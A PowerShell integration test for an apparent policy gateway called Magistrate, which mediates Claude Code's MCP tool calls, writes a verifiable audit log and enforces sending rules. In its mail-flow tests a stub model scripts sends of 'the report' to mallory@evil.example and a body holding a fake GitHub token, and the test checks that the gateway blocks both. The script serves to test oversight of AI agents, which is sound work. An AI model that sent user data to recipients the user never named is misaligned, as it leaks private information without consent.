# Drives the real Claude Code client through the gateway, with no model and no paid API, then checks
# the audit log and what reached the server. This is the runnable end of milestones 1 to 3, plus the
# secret scanner of milestone 5.
#
#     pwsh -NoProfile -File test/interop/run.ps1
#
# Everything this script makes lives in one temp folder. What keeps the run free and private:
#   - Credential and client variables are removed from this process, and put back at the end.
#   - CLAUDE_CONFIG_DIR points at a throwaway folder, so no real settings or sign-in are read.
#   - ANTHROPIC_BASE_URL points at a stub on 127.0.0.1, and the token is a placeholder.
#
# It exits 0 if every check passed, and 1 if any failed. A failed run keeps its temp folder for
# reading; -KeepTemp keeps it after a passing run too.
param([switch]$KeepTemp)

$ErrorActionPreference = 'Stop'
$repo = (Resolve-Path (Join-Path $PSScriptRoot '../..')).Path
$work = Join-Path ([IO.Path]::GetTempPath()) ('magistrate-interop-' + [guid]::NewGuid().ToString('N'))
$exe = if ($env:OS -eq 'Windows_NT') { '.exe' } else { '' }
$script:failures = 0
$stub = $null
$removedEnv = @()
$addedEnv = @('CLAUDE_CONFIG_DIR', 'ANTHROPIC_BASE_URL', 'ANTHROPIC_AUTH_TOKEN', 'DISABLE_TELEMETRY',
    'CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC', 'ENABLE_TOOL_SEARCH')

function Check([string]$what, [bool]$ok, [string]$detail = '') {
    if ($ok) {
        Write-Output "PASS  $what"
    } else {
        Write-Output "FAIL  $what"
        if ($detail) { Write-Output "      $detail" }
        $script:failures++
    }
}

function Write-Json([string]$path, $value) {
    # WriteAllText writes UTF-8 with no byte order mark, which the strict policy loader requires.
    [IO.File]::WriteAllText($path, ($value | ConvertTo-Json -Depth 8))
}

# Allows the file to be open elsewhere, since the stub model keeps its log open while it runs.
function Read-Text([string]$path) {
    if (-not (Test-Path $path)) { return '' }
    $reader = New-Object IO.StreamReader([IO.File]::Open($path, 'Open', 'Read', 'ReadWrite'))
    try { return $reader.ReadToEnd() } finally { $reader.Close() }
}

# Runs a program with its stdin empty and its output in files, and returns the exit code. Start-Process
# joins arguments with spaces and quotes nothing, so each is quoted here, which also keeps "" alive.
function Invoke-Client([string]$name, [string]$file, [string[]]$arguments, [int]$seconds) {
    $line = ($arguments | ForEach-Object { '"' + $_ + '"' }) -join ' '
    $p = Start-Process -FilePath $file -ArgumentList $line -WorkingDirectory $work -NoNewWindow -PassThru `
        -RedirectStandardInput (Join-Path $work 'empty.txt') `
        -RedirectStandardOutput (Join-Path $work "$name.out") -RedirectStandardError (Join-Path $work "$name.err")
    $null = $p.Handle # ExitCode stays empty later unless the handle was opened while it ran
    if (-not $p.WaitForExit($seconds * 1000)) {
        Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
        Write-Host "      $name timed out after $seconds s"
        return 124
    }
    return $p.ExitCode
}

# Milestone 3's flow: the model reads the inbox, then sends to $to. The prompt file says what the user
# asked for, a stub model of its own plays the two calls, and "magistrate run" starts the real client.
function Invoke-MailFlow([string]$name, [string]$prompt, [string]$to, [string[]]$clientFlags = @(), [string]$body = 'the report') {
    $promptFile = Join-Path $work "$name.prompt"
    [IO.File]::WriteAllText($promptFile, $prompt)
    $steps = Join-Path $work "$name.steps"
    [IO.File]::WriteAllText($steps, '[{"tool":"mcp__magistrate__mail__read_inbox","input":{}},' +
        '{"tool":"mcp__magistrate__mail__send_mail","input":{"to":"' + $to + '","body":"' + $body + '"}}]')
    $flowPort = Join-Path $work "$name.port"
    $flowStub = Start-Process -FilePath $model -NoNewWindow -PassThru `
        -ArgumentList ('-log "{0}" -portfile "{1}" -steps "{2}"' -f (Join-Path $work "$name.model.log"), $flowPort, $steps) `
        -RedirectStandardOutput (Join-Path $work "$name.stub.out") -RedirectStandardError (Join-Path $work "$name.stub.err")
    try {
        for ($i = 0; $i -lt 100 -and -not (Test-Path $flowPort); $i++) { Start-Sleep -Milliseconds 50 }
        if (-not (Test-Path $flowPort)) { throw "the stub model for $name did not start" }
        $env:ANTHROPIC_BASE_URL = 'http://127.0.0.1:' + (Get-Content $flowPort).Trim()
        return Invoke-Client $name $gateway (@('run', '--policy', $mailPolicy, '--state', (Join-Path $work "$name-state"),
                '--prompt-file', $promptFile, '--client', $claude.Source, '--', '-p', '--model', 'stub',
                '--allowedTools', 'mcp__magistrate__mail__read_inbox,mcp__magistrate__mail__send_mail',
                '--output-format', 'json') + $clientFlags) 120
    } finally {
        Stop-Process -Id $flowStub.Id -Force -ErrorAction SilentlyContinue
    }
}

# Runs magistrate verify, prints what it said, and returns the exit code.
function Invoke-Verify([string]$name, [string[]]$arguments) {
    $code = Invoke-Client $name $gateway (@('verify') + $arguments) 30
    $said = (Read-Text (Join-Path $work "$name.out")) + (Read-Text (Join-Path $work "$name.err"))
    Write-Host ('      ' + $name + ': exit ' + $code + ': ' + $said.Trim().Replace($work, '<work>'))
    return $code
}

try {
    New-Item -ItemType Directory -Force $work | Out-Null
    [IO.File]::WriteAllText((Join-Path $work 'empty.txt'), '')
    Write-Output "work folder: $work"

    # Build.
    $gateway = Join-Path $work "magistrate$exe"
    $echo = Join-Path $work "echoserver$exe"
    $model = Join-Path $work "stubmodel$exe"
    Push-Location $repo
    try {
        go build -o $gateway ./cmd/magistrate
        Check 'build the gateway' ($LASTEXITCODE -eq 0)
        go build -o $echo ./test/interop/echoserver
        Check 'build the echo server' ($LASTEXITCODE -eq 0)
        go build -o $model ./test/interop/stubmodel
        Check 'build the stub model' ($LASTEXITCODE -eq 0)
    } finally {
        Pop-Location
    }
    if ($script:failures -gt 0) { throw 'the build failed' }

    $claude = Get-Command claude -ErrorAction SilentlyContinue
    if (-not $claude) { throw 'claude is not on PATH' }

    # This process only, and put back in the finally block.
    $removedEnv = @(Get-ChildItem Env: |
        Where-Object { $_.Name -match '^(ANTHROPIC_|CLAUDE|MCP_|AWS_BEARER|OPENAI_|GEMINI_|GOOGLE_)' } |
        ForEach-Object { [pscustomobject]@{ Name = $_.Name; Value = $_.Value } })
    foreach ($v in $removedEnv) { Remove-Item "Env:$($v.Name)" }

    # Stub model. A value only this run knows goes in as the tool's argument, so the checks below can
    # follow it to the server and back, and look for it in the log.
    $canary = 'interop-canary-' + [guid]::NewGuid().ToString('N')
    $modelLog = Join-Path $work 'model.log'
    $portFile = Join-Path $work 'port.txt'
    $stubArgs = '-log "{0}" -portfile "{1}" -tool mcp__magistrate__echo__echo -text {2}' -f $modelLog, $portFile, $canary
    $stub = Start-Process -FilePath $model -ArgumentList $stubArgs -NoNewWindow -PassThru `
        -RedirectStandardOutput (Join-Path $work 'stub.out') -RedirectStandardError (Join-Path $work 'stub.err')
    for ($i = 0; $i -lt 100 -and -not (Test-Path $portFile); $i++) { Start-Sleep -Milliseconds 50 }
    if (-not (Test-Path $portFile)) { throw 'the stub model did not start' }
    $port = (Get-Content $portFile).Trim()
    Write-Output "stub model on 127.0.0.1:$port"

    $env:CLAUDE_CONFIG_DIR = Join-Path $work 'claude-config'
    New-Item -ItemType Directory -Force $env:CLAUDE_CONFIG_DIR | Out-Null
    $env:ANTHROPIC_BASE_URL = "http://127.0.0.1:$port"
    $env:ANTHROPIC_AUTH_TOKEN = 'local-stub-not-a-key'
    $env:DISABLE_TELEMETRY = '1'
    $env:CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC = '1'
    $env:ENABLE_TOOL_SEARCH = 'false'

    # The gateway's policy and how the client starts it. "mcp list" reads the config folder, while the
    # -p run gets the DESIGN section 7 flags, so that the gateway is all it can reach.
    $policy = Join-Path $work 'policy.json'
    $state = Join-Path $work 'state'
    $log = Join-Path $state 'audit.log'
    Write-Json $policy @{ mode = 'pass'; servers = @{ echo = @{ command = $echo } } }
    $entry = @{ type = 'stdio'; command = $gateway; args = @('serve', '--policy', $policy, '--state', $state) }
    $mcpConfig = Join-Path $work 'mcp-config.json'
    Write-Json $mcpConfig @{ mcpServers = @{ magistrate = $entry } }
    Write-Json (Join-Path $env:CLAUDE_CONFIG_DIR '.claude.json') @{ hasCompletedOnboarding = $true; mcpServers = @{ magistrate = $entry } }

    # Milestone 1: mcp list connects through the gateway.
    Write-Output '--- claude mcp list'
    $code = Invoke-Client 'mcp-list' $claude.Source @('mcp', 'list') 60
    $listed = Read-Text (Join-Path $work 'mcp-list.out')
    $listed -split "`r?`n" | Where-Object { $_ } | ForEach-Object { Write-Output ('      ' + $_.Replace($work, '<work>')) }
    Check 'claude mcp list exits 0' ($code -eq 0) (Read-Text (Join-Path $work 'mcp-list.err'))
    Check 'claude mcp list connects through the gateway' ($listed -match 'magistrate:.*Connected') $listed

    # Milestone 1: one real tool call goes through it from claude -p.
    Write-Output '--- claude -p'
    $code = Invoke-Client 'print' $claude.Source @(
        '-p', 'say hi', '--tools', '', '--strict-mcp-config', '--mcp-config', $mcpConfig,
        '--model', 'stub', '--allowedTools', 'mcp__magistrate__echo__echo', '--output-format', 'json') 120
    $printed = Read-Text (Join-Path $work 'print.out')
    $errors = Read-Text (Join-Path $work 'print.err')
    $modelSaw = Read-Text $modelLog
    $modelSaw -split "`r?`n" | Where-Object { $_ } | ForEach-Object {
        Write-Output ('      ' + $_.Substring(0, [Math]::Min(160, $_.Length)))
    }
    Check 'claude -p exits 0' ($code -eq 0) "$errors $printed"
    Check 'the model saw the tool through the gateway' ($modelSaw -match 'toolListed=true') $modelSaw
    Check 'the model was offered no built-in tools, so --tools "" took effect' (($modelSaw -match 'builtinTools=false') -and ($modelSaw -notmatch 'builtinTools=true')) $modelSaw
    Check 'the tool result came back through the gateway' ($modelSaw -match ('TOOLRESULT .*echo: ' + $canary)) $modelSaw
    Check 'the client finished the turn' ($printed -match '"result":"done"') $printed

    # Milestone 2: the log holds the call and verifies; flip a byte and it fails.
    Write-Output '--- magistrate verify'
    $logText = Read-Text $log
    Check 'the log holds the decision' ($logText -match '"tool":"echo__echo","decision":"allow"') $logText
    Check 'the argument value is not in the log' (-not $logText.Contains($canary))
    Check 'verify passes on the real log' ((Invoke-Verify 'verify-good' @($log)) -eq 0)
    $head = if ((Read-Text (Join-Path $work 'verify-good.out')) -match 'head ([0-9a-f]{64})') { $Matches[1] } else { '' }
    Check 'verify passes with its saved head' ((Invoke-Verify 'verify-head' @($log, '--head', $head)) -eq 0)

    $bytes = [IO.File]::ReadAllBytes($log)
    $middle = [int]($bytes.Length / 2)
    $bytes[$middle] = $bytes[$middle] -bxor 1
    $flipped = Join-Path $work 'flipped.log'
    [IO.File]::WriteAllBytes($flipped, $bytes)
    Check 'verify fails with exit 1 after one flipped byte' ((Invoke-Verify 'verify-flipped' @($flipped)) -eq 1)

    $cut = Join-Path $work 'cut.log'
    [IO.File]::WriteAllText($cut, ([IO.File]::ReadAllLines($log))[0] + "`n")
    Check 'verify fails with exit 1 when lines before a saved head are gone' ((Invoke-Verify 'verify-cut' @($cut, '--head', $head)) -eq 1)

    # Milestone 3: init drafts a policy from what the server lists, and that policy is enforced.
    Write-Output '--- magistrate init'
    $sends = Join-Path $work 'sends.log'
    $mailBase = Join-Path $work 'mail-base.json'
    Write-Json $mailBase @{ mode = 'value'; servers = @{ mail = @{ command = $echo; args = @('-sends', $sends) } } }
    $code = Invoke-Client 'init' $gateway @('init', '--policy', $mailBase) 60
    $draft = Read-Text (Join-Path $work 'init.out')
    Check 'init exits 0' ($code -eq 0) (Read-Text (Join-Path $work 'init.err'))
    Check 'init drafts send_mail as an act' ($draft -match '"mail__send_mail":\s*\{\s*"effect":\s*"act"') $draft
    $mailPolicy = Join-Path $work 'mail-policy.json'
    [IO.File]::WriteAllText($mailPolicy, $draft)

    # A read, then a send to someone the user never named. Print mode has no person to ask, so the
    # client cancels the question: the call must be refused, and the model must be told the rule.
    Write-Output '--- magistrate run: a send to someone not in the prompt'
    $code = Invoke-MailFlow 'refused' 'Summarize my inbox and tell alice@corp.example what it says.' 'mallory@evil.example'
    $modelSaw = Read-Text (Join-Path $work 'refused.model.log')
    $logText = Read-Text (Join-Path (Join-Path $work 'refused-state') 'audit.log')
    Check 'run exits 0 after the refusal' ($code -eq 0) ((Read-Text (Join-Path $work 'refused.err')) + (Read-Text (Join-Path $work 'refused.out')))
    Check 'the rule ID reached the model' ($modelSaw -match 'Blocked by Magistrate, rule ask-cancelled') $modelSaw
    Check 'the server never received the send' (-not (Read-Text $sends).Contains('mallory')) (Read-Text $sends)
    Check 'the log holds why it asked and how that ended' (($logText -match '"decision":"ask","rule":"unsourced-control"') -and ($logText -match '"decision":"block","rule":"ask-cancelled"')) $logText
    Check 'the recipient is not in the log' (-not $logText.Contains('mallory'))

    # The same flow with a recipient named in the prompt goes through, and nobody is asked.
    Write-Output '--- magistrate run: a send to someone named in the prompt'
    $code = Invoke-MailFlow 'allowed' 'Summarize my inbox and tell alice@corp.example what it says.' 'alice@corp.example'
    $logText = Read-Text (Join-Path (Join-Path $work 'allowed-state') 'audit.log')
    Check 'run exits 0' ($code -eq 0) ((Read-Text (Join-Path $work 'allowed.err')) + (Read-Text (Join-Path $work 'allowed.out')))
    Check 'the server received the send' ((Read-Text $sends).Contains('SENT to=alice@corp.example')) (Read-Text $sends)
    Check 'the log says the prompt vouched for it' ($logText -match '"decision":"allow","sources":\["prompt"\]') $logText
    Check 'nobody was asked' ($logText -notmatch '"decision":"ask"') $logText
    Check 'verify passes on that log' ((Invoke-Verify 'verify-allowed' @((Join-Path (Join-Path $work 'allowed-state') 'audit.log'))) -eq 0)

    # DESIGN section 7 asks whether --restricted works with this setup. This records the answer.
    Write-Output '--- magistrate run: the same two flows with --restricted'
    $code = Invoke-MailFlow 'restricted-allowed' 'Summarize my inbox and tell bob@corp.example what it says.' 'bob@corp.example' @('--restricted')
    Check 'with --restricted, a named recipient still goes through' (($code -eq 0) -and (Read-Text $sends).Contains('SENT to=bob@corp.example')) ((Read-Text (Join-Path $work 'restricted-allowed.err')) + (Read-Text (Join-Path $work 'restricted-allowed.out')))
    $code = Invoke-MailFlow 'restricted-refused' 'Summarize my inbox and tell bob@corp.example what it says.' 'mallory@evil.example' @('--restricted')
    Check 'with --restricted, an unnamed recipient is still refused' (-not (Read-Text $sends).Contains('mallory')) (Read-Text $sends)
    $modelSaw = Read-Text (Join-Path $work 'restricted-refused.model.log')
    Check 'with --restricted, the model still sees no built-in tools and the rule ID' (($modelSaw -match 'Blocked by Magistrate') -and ($modelSaw -notmatch 'builtinTools=true')) $modelSaw

    # Milestone 5: a known-format secret is blocked with nobody asked, even going to a named recipient.
    # The token is fake and built here, so that no complete one sits in a file.
    Write-Output '--- magistrate run: a credential in a send'
    $token = 'gh' + 'p_' + [guid]::NewGuid().ToString('N') + 'aB3dE6'
    $code = Invoke-MailFlow 'secret' 'Summarize my inbox and tell carol@corp.example what it says.' 'carol@corp.example' @() "my token is $token"
    $modelSaw = Read-Text (Join-Path $work 'secret.model.log')
    $logText = Read-Text (Join-Path (Join-Path $work 'secret-state') 'audit.log')
    Check 'the secret rule reached the model' ($modelSaw -match 'Blocked by Magistrate, rule github-token') $modelSaw
    Check 'the server never received that send' (-not (Read-Text $sends).Contains('carol')) (Read-Text $sends)
    Check 'nobody was asked about it' ($logText -notmatch '"decision":"ask"') $logText
    Check 'the token is not in the log' (-not $logText.Contains($token))

    # Nothing of ours may still be running: the client ended the gateway and the gateway ended the server.
    Start-Sleep -Milliseconds 500
    $left = Get-Process | Where-Object { $_.Id -ne $stub.Id -and $_.Path -and $_.Path.StartsWith($work) }
    Check 'no gateway or server process is left running' (-not $left) ($left | Out-String)
} catch {
    Check "the run finished ($_)" $false
} finally {
    if ($stub) { Stop-Process -Id $stub.Id -Force -ErrorAction SilentlyContinue }
    foreach ($name in $addedEnv) { Remove-Item "Env:$name" -ErrorAction SilentlyContinue }
    foreach ($v in $removedEnv) { Set-Item "Env:$($v.Name)" $v.Value }
}

if ($script:failures -gt 0) {
    Write-Output "FAILED: $script:failures check(s). The work folder is kept: $work"
    exit 1
}
Write-Output 'all checks passed'
if (-not $KeepTemp) {
    Start-Sleep -Milliseconds 200 # the stub's handles close a moment after it is stopped
    Remove-Item $work -Recurse -Force -ErrorAction SilentlyContinue
}
exit 0
